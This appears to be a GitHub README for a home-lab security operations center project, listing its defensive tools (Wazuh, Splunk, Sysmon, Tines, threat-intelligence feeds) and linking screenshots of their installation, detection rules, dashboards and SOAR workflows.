This project demonstrates a practical enterprise SOC architecture using open-source and commercial security technologies.

The environment covers the complete workflow from endpoint telemetry collection to centralized monitoring, detection engineering, investigation, threat intelligence enrichment, SOAR automation, and security notification.

The combination of:

```text
Active Directory
      +
Windows / Linux
      +
Sysmon
      +
Wazuh
      +
Splunk
      +
MITRE ATT&CK
      +
Tines
      +
Threat Intelligence
      +
Slack
```
**Technologies**

```text
Active Directory
Windows Server
Windows 11
Ubuntu
Kali Linux
Wazuh
Splunk
Sysmon
Tines
VirusTotal
AbuseIPDB
Slack
MITRE ATT&CK
SIEM
SOAR
XDR
FIM
Atomic Red Team
```

# 40. Screenshots

## Wazuh Installation
<img width="1662" height="792" alt="Wazuh curl" src="https://github.com/user-attachments/assets/9b31d8cb-121d-4803-a9e2-936c15dbd9b5" />
<img width="1660" height="866" alt="Wazuh Installation begins" src="https://github.com/user-attachments/assets/4222ef98-64e9-4bf8-8436-087c398502bf" />

## Wazuh Archives
<img width="1652" height="872" alt="Enabling archives" src="https://github.com/user-attachments/assets/ad8595f7-bf09-4379-8a2d-1f2e87cc8c9f" />
<img width="1655" height="880" alt="Enabling archives after" src="https://github.com/user-attachments/assets/5eeb216b-8d47-41e7-a198-7ebf53a58f64" />

## Modify Filebeat
<img width="1641" height="757" alt="Modify filebeat after" src="https://github.com/user-attachments/assets/d46b8186-fb47-4689-8a2d-ec808cc73ea5" />

## Wazuh-archives index
<img width="1663" height="678" alt="Creating wazuh-archives index patterns" src="https://github.com/user-attachments/assets/caf90734-e9fc-4a67-9586-6da3475ec5b7" />
<img width="1656" height="727" alt="adding wazuh-archives index patterns" src="https://github.com/user-attachments/assets/08c5b6ab-570e-472a-941a-8fd32eb4b868" />
<img width="1663" height="867" alt="Created wazuh-archives index patterns" src="https://github.com/user-attachments/assets/ab82cda5-c270-4fb8-92b3-5cce4ee6b275" />

## Wazuh Agents Deployment
<img width="1918" height="760" alt="Adding new agent" src="https://github.com/user-attachments/assets/3ced24df-8a4c-4ef4-ba25-324b1502930f" />
<img width="1897" height="321" alt="Adding new agent_PC" src="https://github.com/user-attachments/assets/9a6a25b9-e9db-4fb6-b943-4af5850f65cb" />
<img width="1916" height="868" alt="Troubleshoot (Solved)" src="https://github.com/user-attachments/assets/cf582899-cf5d-4d89-99eb-72627d1d3413" />

## Sysmon Conf
 <img width="1667" height="832" alt="add sysmon to ossec conf files - notedpad" src="https://github.com/user-attachments/assets/0c59e2ce-9e0d-4327-b771-052285b932fc" />

## Wazuh Event
<img width="1918" height="866" alt="Wazuh Event" src="https://github.com/user-attachments/assets/56ee9d33-efd5-48e4-82b3-a240b50d7ee0" />

## FIM Conf
<img width="1917" height="195" alt="FIM Integration (PC)" src="https://github.com/user-attachments/assets/1befbbd0-72a3-4953-b557-b62e7e9dcf0d" />
<img width="1940" height="219" alt="FIM Check(server)" src="https://github.com/user-attachments/assets/b77c007c-7522-40d5-9d0d-a1ecaa86f2a3" />

## Dashboard Conf
<img width="1903" height="707" alt="dashboard1" src="https://github.com/user-attachments/assets/44244997-0102-4e1c-9fda-27da761c5ff5" />
<img width="1912" height="731" alt="dashboard" src="https://github.com/user-attachments/assets/1e53600e-58cd-41fd-8746-75a69dca586b" />

## Custom Detection Rules
<img width="1910" height="693" alt="Custome rules set" src="https://github.com/user-attachments/assets/63052521-fbbd-4b49-8576-06e61c396a12" />
<img width="1917" height="533" alt="Custome rules1" src="https://github.com/user-attachments/assets/f63b0d6d-1a33-48f0-9e6f-0f95ce1baaa5" />

## Splunk Installation
<img width="1617" height="237" alt="Splunk Install" src="https://github.com/user-attachments/assets/98f1ed55-6dc7-4d24-9c4c-1aacecd4da1f" />
<img width="1892" height="792" alt="Splunk started" src="https://github.com/user-attachments/assets/cd2cb2b6-7136-4ba0-9d4c-1f03260146df" />

## Splunk Universal Forwarder 
<img width="1411" height="747" alt="Installing splunk universal forwarder2" src="https://github.com/user-attachments/assets/f4a11883-b7c3-420c-92a8-d8b43a3e8916" />

## Splunk Index
<img width="1893" height="666" alt="endpoint index created" src="https://github.com/user-attachments/assets/5018b69a-5056-4281-ae6b-789c06df579a" />
<img width="1620" height="647" alt="inputs conf" src="https://github.com/user-attachments/assets/db384f22-d9b4-4ee7-ad7a-5f351573f009" />

## Splunk Search
<img width="1917" height="767" alt="Splunk Dashboard" src="https://github.com/user-attachments/assets/bd4cbf6b-e4b0-4ab7-b5f8-ad397529ad3b" />
<img width="1915" height="810" alt="Splunk Log sources" src="https://github.com/user-attachments/assets/0963a503-92fc-4b38-95f1-b0fa2b9a4632" />

## Splunk Alert
<img width="1908" height="818" alt="Splunk Alert" src="https://github.com/user-attachments/assets/244fd0d8-223b-43c4-8c13-f3027ad6c704" />

## Tines (SOAR)
<img width="1893" height="786" alt="Tines Dashboard" src="https://github.com/user-attachments/assets/15fe52c0-0afa-4d2a-b32e-4871510832ac" />
<img width="1917" height="795" alt="SOAR3" src="https://github.com/user-attachments/assets/902ccf83-1833-4918-8f61-84c602ef5e52" />
<img width="1916" height="811" alt="SOAR4" src="https://github.com/user-attachments/assets/e0492ef0-c178-40cb-acad-fc011d3908a8" />
<img width="1918" height="607" alt="SOAR5" src="https://github.com/user-attachments/assets/ea5987db-020f-44bb-869a-49f1180cebeb" />

















